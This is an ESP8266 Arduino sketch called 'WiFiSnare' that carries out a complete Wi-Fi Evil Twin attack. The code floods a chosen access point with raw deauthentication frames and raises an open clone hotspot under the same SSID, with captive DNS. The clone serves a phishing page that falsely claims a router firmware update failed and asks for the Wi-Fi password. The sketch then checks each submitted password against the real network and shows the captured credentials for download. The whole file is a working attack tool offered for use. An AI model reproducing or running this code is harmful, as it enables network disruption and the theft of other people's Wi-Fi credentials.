/*
 * WiFiSnare
 * A tool that captures 2.4GHz Wi-Fi passwords via Evil Twin attack.
 * Author - WireBits
 */

#include <Arduino.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

extern "C" {
  #include "user_interface.h"
}

DNSServer dnsServer;
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
ESP8266WebServer webServer(80);
IPAddress subNetMask(255, 255, 255, 0);

const char *ssid = "WiFiSnare";
const char *password = "wifisnare";

const int apLED = 16;
unsigned long now = 0;
String tryPassword = "";
const int statusLED = 2;
uint8_t wifi_channel = 1;
unsigned long wifinow = 0;
String correctPassword = "";
bool hotspot_active = false;
unsigned long deauth_now = 0;
bool deauthing_active = false;

uint8_t deauthPacket[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00,
  0x07, 0x00
};

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t encryption;
} networkDetails;

networkDetails networks[16];
networkDetails selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    networkDetails network;
    networks[i] = network;
  }
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n <= 0) return;
  int count = min(n, 16);
  for (int i = 0; i < count; ++i) {
    networkDetails network;
    network.ssid = WiFi.SSID(i);
    memcpy(network.bssid, WiFi.BSSID(i), 6);
    network.ch = WiFi.channel(i);
    network.rssi = WiFi.RSSI(i);
    network.encryption = WiFi.encryptionType(i);
    networks[i] = network;
  }
}

String encryptionTypeStr(uint8_t type) {
  switch(type) {
    case ENC_TYPE_NONE: return "Open";
    case ENC_TYPE_WEP: return "WEP";
    case ENC_TYPE_TKIP: return "WPA";
    case ENC_TYPE_CCMP: return "WPA2";
    case ENC_TYPE_AUTO: return "Auto";
    default: return "Unknown";
  }
}

String bytesToStr(const uint8_t* bytes, uint32_t size) {
  String result;
  for (uint32_t i = 0; i < size; ++i) {
    if (i > 0) result += ':';
    if (bytes[i] < 0x10) result += '0';
    result += String(bytes[i], HEX);
  }
  return result;
}

String index() {
  String victimSSID = String(selectedNetwork.ssid);
  String html = "<!DOCTYPE html>"
                "<html><head>"
                "<title>" + victimSSID + " : Sign Up</title>"
                "<meta charset='UTF-8'>"
                "<meta name='viewport' content='width=device-width,initial-scale=1'>"
                "<style>"
                "body {color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0;}"
                "div {padding: 0.5em; text-align: center;}"
                "input {width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #555; border-radius: 10px;}"
                "label {color: #333; display: block; font-style: italic; font-weight: bold;}"
                "nav {background: #0066ff;color: #fff;padding: 1em;}"
                "nav b {font-size: 1.5em;}"
                "</style></head>"
                "<body>"
                "<nav><b>" + victimSSID + "</b><br>Router Info.</nav>"
                "<div>Your router encountered a problem while automatically installing the latest firmware update.<br>To revert the old firmware and manually update later, please verify your password.</div>"
                "<div><form action='/' method='post'>"
                "<label>WiFi password:</label>"
                "<input type='password' id='password' name='password' minlength='8' required>"
                "<input type='submit' value='Continue'>"
                "</form></div>"
                "<footer>&#169; All rights reserved.</footer>"
                "</body>"
                "</html>";
  return html;
}

String redirectPage() {
  String victimSSID = String(selectedNetwork.ssid);
  String redirectMessage = "<!DOCTYPE html>"
                           "<html lang='en'>"
                           "<head>"
                           "<meta charset='UTF-8'>"
                           "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                           "<title>" + victimSSID + " : Validation Panel</title>"
                           "<style>"
                           "body{color: #333;font-family: 'Century Gothic', sans-serif;font-size: 18px;line-height: 24px;margin: 0;padding: 0;}"
                           "nav{background: #0066ff;color: #fff;padding: 1em;}"
                           "nav b{font-size: 1.5em;}"
                           "div{padding: 0.5em; text-align: center;}"
                           "footer{padding: 1em;text-align: center;font-size: 14px;}"
                           "</style>"
                           "</head>"
                           "<body>"
                           "<nav><b>" + victimSSID + "</b><br>Validation Panel</nav>"
                           "<div><center>Verifying the password<br>Please wait...</center></div>"
                           "<script>"
                           "setTimeout(function() {"
                           "    window.location.href = '/result';"
                           "}, 15000);"
                           "</script>"
                           "<footer>&#169; All rights reserved.</footer>"
                           "</body>"
                           "</html>";
  return redirectMessage;
}

String updatePage(bool success) {
  String victimSSID = String(selectedNetwork.ssid);
  String updateMessage = "<!DOCTYPE html>"
                         "<html lang='en'>"
                         "<head>"
                         "<meta charset='UTF-8'>"
                         "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                         "<title>" + victimSSID + " : Validation Panel</title>"
                         "<style>"
                         "body{color: #333;font-family: 'Century Gothic', sans-serif;font-size: 18px;line-height: 24px;margin: 0;padding: 0;}"
                         "nav{background: #0066ff;color: #fff;padding: 1em;}"
                         "nav b{font-size: 1.5em;}"
                         "div{padding: 0.5em;text-align: center;}"
                         "footer{padding: 1em;text-align: center;font-size: 14px;}"
                         "</style>"
                         "</head>"
                         "<body>"
                         "<nav><b>" + victimSSID + "</b><br>Validation Panel</nav>";
  if (success) {
    updateMessage += "<div>Thank You.<br>Your router will restart soon.</div>";
  } else {
    updateMessage += "<div>Incorrect Password!<br>Please try again.</div>"
                     "<script>"
                     "setTimeout(function() {"
                     "    window.location.href = '/';"
                     "}, 3000);"
                     "</script>";
  }
  updateMessage += "<footer>&#169; All rights reserved.</footer>"
                   "</body>"
                   "</html>";
  return updateMessage;
}

void handleResult() {
  bool connected = (WiFi.status() == WL_CONNECTED);
  if (!connected) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", updatePage(false));
    blinkLED(2);
    return;
  }
  webServer.send(200, "text/html", updatePage(true));
  if (tryPassword != "") {
    String credentialsHtml;
    credentialsHtml += "<hr><div style='text-align: center;'>";
    credentialsHtml += "<h1>Captured Credentials</h1>";
    credentialsHtml += "<p>SSID : " + selectedNetwork.ssid + "</p>";
    credentialsHtml += "<p>Password : " + tryPassword + "</p>";
    credentialsHtml += "<button class='cred-btn' onclick=\"downloadPassword()\">Download Credentials</button></div>";
    credentialsHtml += R"rawliteral(
    <script>
      function downloadPassword() {
        const ssid = ')rawliteral" + selectedNetwork.ssid + R"rawliteral(';
        const password = ')rawliteral" + tryPassword + R"rawliteral(';
        const content = 'SSID : ' + ssid + '\nPassword : ' + password;
        const blob = new Blob([content], { type: 'text/plain' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        const safeSSID = ssid.replace(/[^a-zA-Z0-9]/g, '_');
        link.download = 'credentials_' + safeSSID + '.txt';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      }
    </script>
    )rawliteral";
    correctPassword += credentialsHtml;
    webServer.send(200, "text/html", correctPassword);
  }
  hotspot_active = false;
  deauthing_active = false;
  blinkLED(3);
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(apIP, apIP, subNetMask);
  WiFi.softAP(ssid, password);
  dnsServer.start(53, "*", apIP);
}

String controlPanelPage = "<!DOCTYPE html>"
                          "<html><head>"
                          "<title>WiFiSnare</title>"
                          "<style>"
                          "body {font-family: Arial, sans-serif; padding: 20px; background-color: black; color: white; user-select: none;justify-content: center;align-items: center;}"
                          "h2 {text-align: center; border: 2px solid orange; padding: 10px; width: fit-content; margin: 0 auto; background-color: black; color: white; border-radius: 6px;}"
                          "table {width: 100%; border-collapse: collapse; margin-top: 20px; background-color: transparent; color: white; border: 2px solid #146dcc;}"
                          "th, td {padding: 10px; text-align: center; border: 1px solid #146dcc;}"
                          "th {background-color: rgba(0, 0, 0, 0.5);}"
                          "td {background-color: rgba(0, 0, 0, 0.3);}"
                          "button:hover {opacity: 0.8;}"
                          ".button-container {margin-top: 20px; text-align: center;}"
                          ".button-container button {padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; border: none; border-radius: 4px; color: white;align-items: center;}"
                          ".deauth-btn { background-color: #0C873F; color: white;}"
                          ".eviltwin-btn { background-color: #a55f31; color: white;}"
                          ".cred-btn { background-color: #b414cc; color: white;padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; border: none; border-radius: 4px;}"
                          ".select-btn {background-color: #eb3489; color: white; padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; border: none; border-radius: 4px;}"
                          ".selected-btn {background-color: #FFC72C; color: black; padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; border: none; border-radius: 4px;}"
                          "hr {border: none;height: 2px;background-color: #FFC72C;margin: 20px auto;}"
                          "</style></head><body><h2>WiFiSnare</h2>"
                          "<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Encryption</th><th>Select</th></tr>";

void handleIndex() {
  if (webServer.hasArg("ap")) {
    String selectedBSSID = webServer.arg("ap");
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(networks[i].bssid, 6) == selectedBSSID) {
        selectedNetwork = networks[i];
        break;
      }
    }
  }
  if (webServer.hasArg("deauth")) {
    deauthing_active = (webServer.arg("deauth") == "start");
  }
  if (webServer.hasArg("hotspot")) {
    bool startHotspot = (webServer.arg("hotspot") == "start");
    hotspot_active = startHotspot;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, subNetMask);
    WiFi.softAP(startHotspot ? selectedNetwork.ssid.c_str() : ssid, startHotspot ? NULL : password);
    dnsServer.start(53, "*", apIP);
    return;
  }
  if (hotspot_active) {
    if (webServer.hasArg("password")) {
      tryPassword = webServer.arg("password");
      bool restartDeauth = false;
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
        restartDeauth = true;
      }
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(selectedNetwork.ssid.c_str(), tryPassword.c_str(), selectedNetwork.ch, selectedNetwork.bssid);
      webServer.send(200, "text/html", redirectPage());
      if (restartDeauth) {
        deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", index());
    }
    return;
  }
  String controlPanel = "<!DOCTYPE html>"
                        "<html><head>"
                        "<title>WiFiSnare</title>"
                        "<style>"
                        "body {font-family: Arial, sans-serif; padding: 20px; background-color: black; color: white; user-select: none;justify-content: center;align-items: center;}"
                        "h2 {text-align: center; border: 2px solid orange; padding: 10px; width: fit-content; margin: 0 auto; background-color: black; color: white; border-radius: 6px;}"
                        "table {width: 100%; border-collapse: collapse; margin-top: 20px; background-color: transparent; color: white; border: 2px solid #146dcc;}"
                        "th, td {padding: 10px; text-align: center; border: 1px solid #146dcc;}"
                        "th {background-color: rgba(0, 0, 0, 0.5);}"
                        "td {background-color: rgba(0, 0, 0, 0.3);}"
                        "button:hover {opacity: 0.8;}"
                        ".button-container {margin-top: 20px; text-align: center;}"
                        ".button-container button {padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; border: none; border-radius: 4px; color: white;align-items: center;}"
                        ".deauth-btn { background-color: #0C873F; color: white;}"
                        ".eviltwin-btn { background-color: #a55f31; color: white;}"
                        ".cred-btn { background-color: #b414cc; color: white;padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; border: none; border-radius: 4px;}"
                        ".select-btn {background-color: #eb3489; color: white; padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; border: none; border-radius: 4px;}"
                        ".selected-btn {background-color: #FFC72C; color: black; padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; border: none; border-radius: 4px;}"
                        "hr {border: none;height: 2px;background-color: #FFC72C;margin: 20px auto;}"
                        "</style></head><body><h2>WiFiSnare</h2>"
                        "<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Encryption</th><th>Select</th></tr>";
  for (int i = 0; i < 16 && networks[i].ssid != ""; ++i) {
  String bssidStr = bytesToStr(networks[i].bssid, 6);
  bool isSelected = (bssidStr == bytesToStr(selectedNetwork.bssid, 6));
  controlPanel += "<tr><td>" + networks[i].ssid + "</td>"
                  "<td>" + bssidStr + "</td>"
                  "<td>" + String(networks[i].ch) + "</td>"
                  "<td>" + String(networks[i].rssi) + " dBm</td>"
                  "<td>" + encryptionTypeStr(networks[i].encryption) + "</td>"
                  "<td><form method='post' action='/?ap=" + bssidStr + "'>"
                  "<button class='" + String(isSelected ? "selected-btn" : "select-btn") + "'>" + 
                  (isSelected ? "Selected" : "Select") + "</button></form></td></tr>";
  }
  controlPanel += "</table><hr><div class='button-container'>";
  String disabled = (selectedNetwork.ssid == "") ? "disabled" : "";
  controlPanel += "<form style='display:inline-block;' method='post' action='/?deauth=" + String(deauthing_active ? "stop" : "start") + "'>"
                  "<button class='deauth-btn' " + disabled + ">" + String(deauthing_active ? "Stop Deauth" : "Start Deauth") + "</button></form>";
  controlPanel += "<form style='display:inline-block; margin-left:8px;' method='post' action='/?hotspot=" + String(hotspot_active ? "stop" : "start") + "'>"
                  "<button class='eviltwin-btn' " + disabled + ">" + String(hotspot_active ? "Stop EvilTwin" : "Start EvilTwin") + "</button></form>";
  controlPanel += "</div>";
  if (correctPassword != "") {
    controlPanel += "<h3>" + correctPassword + "</h3>";
  }
  controlPanel += "</div></body></html>";
  webServer.send(200, "text/html", controlPanel);
}

void handleAdmin() {
  String controlPanel = controlPanelPage;
  if (webServer.hasArg("ap")) {
    String selectedBSSID = webServer.arg("ap");
    for (int i = 0; i < 16; ++i) {
      if (bytesToStr(networks[i].bssid, 6) == selectedBSSID) {
        selectedNetwork = networks[i];
        break;
      }
    }
  }
  if (webServer.hasArg("deauth")) {
    String deauthCmd = webServer.arg("deauth");
    deauthing_active = (deauthCmd == "start");
  }
  if (webServer.hasArg("hotspot")) {
    String hotspotCmd = webServer.arg("hotspot");
    hotspot_active = (hotspotCmd == "start");
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, subNetMask);
    if (hotspot_active) {
      WiFi.softAP(selectedNetwork.ssid.c_str());
    } else {
      WiFi.softAP(ssid, password);
    }
    dnsServer.start(53, "*", apIP);
    return;
  }
  for (int i = 0; i < 16; ++i) {
    if (networks[i].ssid == "") break;
    String bssidStr = bytesToStr(networks[i].bssid, 6);
    bool isSelected = (bytesToStr(selectedNetwork.bssid, 6) == bssidStr);
    controlPanel += "<tr><td>" + networks[i].ssid + "</td><td>" + bssidStr + "</td><td>" +
             String(networks[i].ch) + "</td><td><form method='post' action='/?ap=" +
             bssidStr + "'>";
    controlPanel += isSelected
           ? "<button class='selected-btn'>Selected</button>"
           : "<button class='select-btn'>Select</button>";
    controlPanel += "</form></td></tr>";
  }
  controlPanel.replace("{deauth_button}", deauthing_active ? "Stop deauthing" : "Start deauthing");
  controlPanel.replace("{deauth}", deauthing_active ? "stop" : "start");
  controlPanel.replace("{hotspot_button}", hotspot_active ? "Stop EvilTwin" : "Start EvilTwin");
  controlPanel.replace("{hotspot}", hotspot_active ? "stop" : "start");
  controlPanel.replace("{disabled}", selectedNetwork.ssid == "" ? " disabled" : "");
  if (correctPassword != "") {
    controlPanel += "<h3>" + correctPassword + "</h3>";
  }
  controlPanel += "</table></div></body></html>";
  webServer.send(200, "text/html", controlPanel);
}

void blinkLED(int times) {
  for (int i = 0; i < times; i++) {
    digitalWrite(statusLED, HIGH);
    delay(500);
    digitalWrite(statusLED, LOW);
    delay(500);
  }
  digitalWrite(statusLED, HIGH);
}
void setup() {
  WiFi.mode(WIFI_AP_STA);
  pinMode(apLED, OUTPUT);
  digitalWrite(apLED, HIGH);
  wifi_promiscuous_enable(1);
  pinMode(statusLED, OUTPUT);
  digitalWrite(statusLED, HIGH);
  WiFi.softAPConfig(apIP, apIP, subNetMask);
  WiFi.softAP(ssid, password);
  dnsServer.start(53, "*", apIP);
  webServer.on("/", handleIndex);
  webServer.on("/admin", handleAdmin);
  webServer.on("/result", handleResult);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (deauthing_active && millis() - deauth_now >= 1000) {
    wifi_set_channel(selectedNetwork.ch);
    memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;
    bytesToStr(deauthPacket, 26);
    deauthPacket[0] = 0xC0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    bytesToStr(deauthPacket, 26);
    deauthPacket[0] = 0xA0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauth_now = millis();
  }
  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }
  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      wifinow = millis();
    }
  }
  int clientCount = WiFi.softAPgetStationNum();
  if (clientCount > 0) {
    digitalWrite(apLED, LOW);
  } else {
    digitalWrite(apLED, HIGH);
  }
}
